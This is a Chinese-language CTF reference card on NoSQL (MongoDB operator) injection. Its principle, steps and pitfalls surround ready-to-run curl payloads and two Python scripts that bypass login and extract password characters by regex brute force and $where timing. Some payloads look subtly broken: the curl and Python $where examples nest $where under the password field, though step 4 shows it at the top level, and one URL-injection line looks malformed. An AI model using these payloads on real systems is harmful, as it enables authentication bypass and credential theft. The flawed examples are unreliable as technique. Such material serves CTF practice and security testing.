---
title: NoSQL 注入（MongoDB 操作符注入）
category: web
tags: [nosql, mongodb, 操作符注入, 认证绕过]
signals: [登录框 返回 json, mongodb, 参数是 json, $ne, $gt, 用户名密码以对象传参, application/json 登录, 查询返回 login=xxx, nosql, 注册接口]
difficulty: medium
source: "PayloadsAllTheThings / OWASP"
tools: [curl, python, mongosh]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 登录接口是 `POST /login`，body 为 `{"username": "admin", "password": "xxx"}`。
- 错误信息里出现 `MongoError`、`$ne`、`BSONTypeError`、`Cast to ObjectId failed`。
- URL 参数 `?username=admin&password=admin` 但服务端把参数当对象处理（`req.body` 直接塞进查询）。
- 题面提示"数据库是 MongoDB"、"nosql"、"绕过登录"。
- 变体：`?id=1` 但匹配的是 `_id`，可用 `$gt`、`$regex`。
- 变体：注册时 `role` 字段可控制 → 注入 `{"$ne": null}` 提升权限。

## 二、原理

MongoDB 查询本质是 JSON/BSON：`db.users.find({username: u, password: p})`。若应用把用户输入直接当**值**传进去，攻击者可以让这个"值"变成**操作符对象**：

```json
{"username": "admin", "password": {"$ne": "x"}}
```

查询变成 `password != "x"`，永远为真 → 绕过认证。

成因：
- 表单/JSON 解析器允许把 `password[$ne]=x` 展开成嵌套对象（PHP `parse_str` 行为、Express 的 `qs` 默认 `extended`）。
- 离线校验 `typeof password === 'string'` 缺失。

常用操作符：`$ne`、`$gt`、`$gte`、`$lt`、`$in`、`$nin`、`$regex`、`$where`、`$exists`、`$or`。

## 三、解题步骤

1. 确认登录/查询参数会进入 MongoDB。
2. 尝试 `$ne` 绕过：`password[$ne]=1`（表单）或 `"password": {"$ne": null}`（JSON）。
3. 需要爆破字段值时用 `$regex`：`{"password": {"$regex": "^a"}}` 逐字符恢复。
4. 需要 JS 执行时用 `$where`：`{"$where": "sleep(5000) || this.password[0]=='a'"}`。
5. 拿到 flag/admin 会话。

## 四、可直接运行的脚本

基础 payload：

```bash
# 表单方式（PHP 会解析成数组/对象）
curl -s "http://TARGET/login.php" -d 'username=admin&password[$ne]=1'
curl -s "http://TARGET/login.php" -d 'username[$ne]=1&password[$ne]=1'
curl -s "http://TARGET/login.php" -d 'username=admin&password[$gt]='

# JSON 方式
curl -s "http://TARGET/api/login" -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$ne":"x"}}'

# 正则 / 前缀爆破
curl -s -H "Content-Type: application/json" \
     -d '{"username":{"$regex":"^adm"},"password":{"$ne":"x"}}' \
     "http://TARGET/api/login"

# $where 时间盲注
curl -s -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$where":"sleep(3000)||this.password[0]==\"a\""}}' \
     "http://TARGET/api/login"

# URL 注入（Express 的 qs 会解析嵌套）
curl -s "http://TARGET/api/user?username=\[$ne\]admin"
curl -s "http://TARGET/api/user?password\\u0000=\\[$ne\\]x"
```

正则逐字符爆破脚本：

```python
import requests, string, time

URL = "http://TARGET/api/login"
CHARS = string.ascii_letters + string.digits + "_{}-!@#"

def test(regex):
    r = requests.post(URL, json={"username": {"$regex": regex},
                                 "password": {"$ne": "x"}}, timeout=5)
    return "success" in r.text.lower() or r.status_code == 200 and "error" not in r.text.lower()

def blast_prefix(field="username", maxlen=40):
    known = ""
    for _ in range(maxlen):
        for c in CHARS:
            pat = "^" + known + (("\\" + c) if c in ".^$*+?()[]{}|\\" else c)
            if test(pat):
                known += c
                print(known)
                break
        else:
            break
    return known

print("恢复值:", blast_prefix())
```

`$where` 时间盲注（当正则有长度限制/被过滤时）：

```python
import requests, time

def char_at(idx):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        js = ('sleep(2000)||this.password.charCodeAt(%d)>%d' % (idx, mid))
        t = time.time()
        requests.post("http://TARGET/api/login",
                      json={"username": "admin", "password": {"$where": js}}, timeout=8)
        if time.time() - t >= 2:
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
print("".join(char_at(i) for i in range(16)))
```

## 五、常见坑 / 变体

- **表单参数名格式**：`password[$ne]=1`（PHP/PHP 兼容框架）和 `password%5B%24ne%5D=1` 等价；Express 的 `qs` 需要 `password[$ne]=1` 或 `password%5B$ne%5D=1`。
- **服务端做了类型校验**：`typeof x !== 'string'` 会让 `$ne` 直接 400，此时只能找其他入口。
- **`$regex` 的 `^` 必须转义**：正则特殊字符如 `.` 要写成 `\\.`。
- **`$where` 被禁用**：MongoDB 4.4+ 默认允许，但很多云服务关了 `$where`；改用 `$regex` + `$gt` 组合。
- 变体：**`$exists` 探测字段**、**`$type` 探测类型**、**`_id` 注入 `$gt`** 遍历集合。
- 变体：**SSRF 打 MongoDB**（`gopher://`），见 `ssrf-internal-access.md`。
- 变体：**注入到 update**：注册时 `role: {"$set": {"role": "admin"}}` 之类的 update 操作符注入。
- 注意：CouchDB 的 `_all_docs`、Elasticsearch 的 `query_string` 也是同类，`{"query":{"bool":{...}}}` 可做 field 探测。

## 六、参考来源

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [OWASP WSTG - Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [MongoDB Manual - Query Operators](https://www.mongodb.com/docs/manual/reference/operator/query/)
- [OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
